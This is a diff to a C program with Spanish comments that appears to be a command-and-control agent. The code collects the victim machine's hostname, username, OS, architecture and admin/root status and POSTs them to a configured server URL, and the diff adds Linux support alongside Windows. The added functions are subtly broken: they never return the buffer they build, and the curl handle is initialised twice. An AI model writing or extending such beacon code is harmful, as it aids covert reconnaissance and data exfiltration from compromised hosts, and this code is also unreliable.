@@ -31,6 +31,10 @@
     #define TYPE "HTTP"
 #endif
 
+#ifndef OS
+    #define OS "Windows"
+#endif
+
 // Estructura utilizada para almacenar los datos de respuesta
 struct response_data {
     char *buffer;   // Puntero al búfer de datos de respuesta
@@ -92,15 +96,15 @@ char *decode_base64(const char *input, size_t input_size, size_t *output_size);
 
 int main(int argc, char *argv[]) { 
     
-    char *output;	
-
-    printf("Enviando datos a: %s", NEW_URL);
+    char *output;
 
     curl_global_init(CURL_GLOBAL_ALL); // Inicializar librería curl
     CURL *curl = curl_easy_init(); // Inicializar una instancia de curl
 
     if (curl){
-   
+
+        curl = curl_easy_init(); // Inicializar una instancia de curl
+
         #ifdef SERVER_CERT
             createCertificates();
         #endif
@@ -183,11 +187,9 @@ void createCertificates(){
 
 }
 
+char* getInfoWindows(){
 
-void sendInfoStart(CURL *curl){
-
-    // Recopila información del agente y la envía al servidor
-    // Información que recopila: hostname, username, os, arquitectura y is_root (nt_system, bool)
+    // Información que recopila: hostname, username, os, arquitectura y is_root (Administrator, bool)
     char hostname[1024];
     DWORD hostname_len = 1024;
     GetComputerName(hostname, &hostname_len);
@@ -216,16 +218,48 @@ void sendInfoStart(CURL *curl){
     char buffer[1024];
     snprintf(buffer, sizeof(buffer), "%s\n%s\n%s\n%s\n%d", hostname, username, os, arch, is_root);
 
+}
+
+char* getInfotLinux(){
+
+    // Información que recopila: hostname, username, os, arquitectura y is_root (root, bool)
+    char hostname[1024];
+    gethostname(hostname, 1024);
+
+    char username[1024];
+    getlogin_r(username, 1024);
+
+    char os[11];
+    snprintf(os, sizeof(os), "%s", "Linux");
+
+    char arch[10];
+    snprintf(arch, sizeof(arch), "%s", sizeof(void *) == 4 ? "x86" : "x64");
+
+    int is_root = 0;
+    if (getuid() == 0) {
+        is_root = 1;
+    }
+
+    char buffer[1024];
+    snprintf(buffer, sizeof(buffer), "%s\n%s\n%s\n%s\n%d", hostname, username, os, arch, is_root);
+
+}
+
+void sendInfoStart(CURL *curl){
+
+    char* osInfo;
+
+    // Si el define OS es Windows, se hace una cosa si es Linux, se hace otra
+    if (strcmp(OS, "Windows") == 0) {
+        osInfo = getInfoWindows();
+    } else if (strcmp(OS, "Linux") == 0) {
+        osInfo = getInfotLinux();
+    }
+
     CURLcode res;
 
-    curl_global_init(CURL_GLOBAL_DEFAULT);
-
-    curl = curl_easy_init();
-
-  
-
     curl_easy_setopt(curl, CURLOPT_URL, NEW_URL);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buffer);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, osInfo);
 
     
     #ifdef SERVER_CERT // Si se ha definido SERVER_CERT, se configura los certificados y claves QUIC
